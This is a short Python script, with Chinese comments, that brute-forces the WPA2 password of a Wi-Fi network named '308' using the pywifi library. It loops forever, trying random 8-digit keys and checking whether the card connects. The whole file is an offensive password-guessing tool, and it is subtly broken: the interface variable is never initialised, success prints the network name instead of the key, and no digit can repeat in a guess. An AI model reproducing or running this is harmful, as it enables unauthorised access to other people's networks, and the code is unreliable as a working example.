import random
import time

import pywifi
import pywifi.const as c

wifi = pywifi.PyWiFi()

wp = None
def get_wifi_card(num = 0):
    global wp
    wp = wifi.interfaces()[num]

    print("网卡接口为",wp.name())

# 打印网卡的名字print(wp.name())
# 扫描wifi print([x.ssid for x in wp.scan_results()])


def get_target(name="308"):
    target = pywifi.Profile()
    target.ssid = name
    target.auth = c.AUTH_ALG_OPEN  # 网卡的开放，
    target.akm.append(c.AKM_TYPE_WPA2PSK)  # wifi加密算法
    target.cipher = c.CIPHER_TYPE_CCMP
    return target


def insert_key_for_target(target, key):
    target.key = key
    return target


def try_key(target, wifi_card):
    wifi_card.remove_all_network_profiles()
    temp_profile = wifi_card.add_network_profile(target)
    wifi_card.connect(temp_profile)
    time.sleep(1)
    # print(wifi_card.status())
    if wifi_card.status() == c.IFACE_CONNECTED:
        print("**" * 10)
        print("密码是", target.ssid)
        print("**" * 10)


if __name__ == "__main__":
    target = get_target("308")
    while 1:
        t = insert_key_for_target(target,"".join(random.sample("123456789",8)))
        try_key(t,wp)